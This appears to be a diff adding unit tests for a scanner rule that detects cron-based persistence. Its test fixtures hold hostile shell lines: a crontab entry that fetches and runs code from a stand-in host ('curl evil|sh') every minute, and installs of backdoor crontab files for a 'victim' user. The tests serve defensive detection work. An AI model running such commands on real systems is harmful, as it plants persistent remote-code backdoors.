@@ -465,6 +465,46 @@ class TestRuleH008CronPersistence:
         ctx = _ctx(content=b"echo hello")
         assert _r_cron_persistence(ctx, "H008") is None
 
+    def test_crontab_bare_stdin_install_triggers(self) -> None:
+        ctx = _ctx(content=b"echo '* * * * * curl evil|sh' | crontab -")
+        assert _r_cron_persistence(ctx, "H008") is not None
+
+    def test_crontab_file_install_triggers(self) -> None:
+        ctx = _ctx(content=b"echo '* * * * * curl evil|sh' > /tmp/c; crontab /tmp/c")
+        assert _r_cron_persistence(ctx, "H008") is not None
+
+    def test_crontab_relative_file_install_triggers(self) -> None:
+        ctx = _ctx(content=b"crontab ./payload.cron")
+        assert _r_cron_persistence(ctx, "H008") is not None
+
+    def test_crontab_home_file_install_triggers(self) -> None:
+        ctx = _ctx(content=b"crontab $HOME/.cron_backdoor")
+        assert _r_cron_persistence(ctx, "H008") is not None
+
+    def test_crontab_u_stdin_install_triggers(self) -> None:
+        ctx = _ctx(content=b"crontab -u victim -")
+        assert _r_cron_persistence(ctx, "H008") is not None
+
+    def test_crontab_u_file_install_triggers(self) -> None:
+        ctx = _ctx(content=b"crontab -u victim /tmp/evilcron")
+        assert _r_cron_persistence(ctx, "H008") is not None
+
+    def test_crontab_substring_no_trigger(self) -> None:
+        ctx = _ctx(content=b"mycrontab -l something")
+        assert _r_cron_persistence(ctx, "H008") is None
+
+    def test_crontab_remove_no_trigger(self) -> None:
+        ctx = _ctx(content=b"crontab -r")
+        assert _r_cron_persistence(ctx, "H008") is None
+
+    def test_crontab_edit_no_trigger(self) -> None:
+        ctx = _ctx(content=b"crontab -e")
+        assert _r_cron_persistence(ctx, "H008") is None
+
+    def test_crontab_prose_no_trigger(self) -> None:
+        ctx = _ctx(content=b"the crontab format uses 5 fields, man crontab for details")
+        assert _r_cron_persistence(ctx, "H008") is None
+
 
 class TestRuleH009SensitiveFiles:
     def test_shadow_triggers(self) -> None:
